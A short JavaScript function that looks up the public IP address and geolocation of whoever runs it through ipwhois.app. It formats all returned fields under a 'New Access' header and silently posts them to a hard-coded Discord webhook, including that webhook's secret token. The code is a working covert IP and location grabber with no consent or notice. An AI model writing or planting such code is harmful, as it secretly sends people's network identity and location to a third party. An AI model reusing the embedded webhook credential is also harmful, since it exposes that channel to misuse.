function req () {
  const get = {
    url:'https://ipwhois.app/json/',
    method:'GET'
  }
  axios(get).then(res => {
    var content = '```New Access: \n\n';
    function capitalize (str) {
      if(!str[0] || str.startsWith('https')) return str;
      else return str[0].toUpperCase()+str.slice(1,);
    }
    for (entry in res.data) {
      content+=capitalize(entry)+': '+capitalize(res.data[entry])+'\n'
    }
    content+='```';
    const post = {
      url:'https://discord.com/api/webhooks/868704030157836298/rlcOp46-O5pLjCLGacY5xDXW6EJbDRTY5fTUGcHSuYJq7UFXDk77sXrVtPCyHmy2pI30',
      method:'POST',
      data:{
        "content":content,
      },
      headers:{
        'content-type':'application/json'
      }
    }
    axios(post);
  })
}
